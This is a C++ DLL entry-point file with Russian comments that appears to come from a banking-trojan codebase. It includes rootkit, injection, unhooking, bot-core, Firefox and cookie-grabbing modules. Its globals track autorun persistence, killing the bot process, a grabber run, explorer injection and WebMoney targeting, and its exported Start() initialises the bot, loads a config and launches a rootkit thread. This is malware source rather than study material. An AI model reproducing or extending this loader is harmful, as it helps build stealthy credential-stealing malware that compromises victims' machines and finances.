// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"
#include "BotConfig.h"

#include "Crypt.h"

#include "Modules.h"

#include "ntdll.h"

#include "coocksol.h"

#include "Firefox.h"

#include "md5.h"

//#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  Система отладочных строк
//------------------------------------------------------------------------------

#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //пид эксплорера




extern"C"  void WINAPI Start()
{
	BOT::Initialize();
	string Msg;
	Msg.Format("1.12 Присоедините среду к процессу [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 

	//pMessageBoxA(NULL, Msg.t_str(), NULL, 0); 
	
//	IfobsOnline::Initialize(); 

//	return;
 
     
	 
	Config::SetFileName("c:\\config\\config.bin");  
	    
	RootkitThread(NULL); 

	while (1) pSleep(100000);    
}



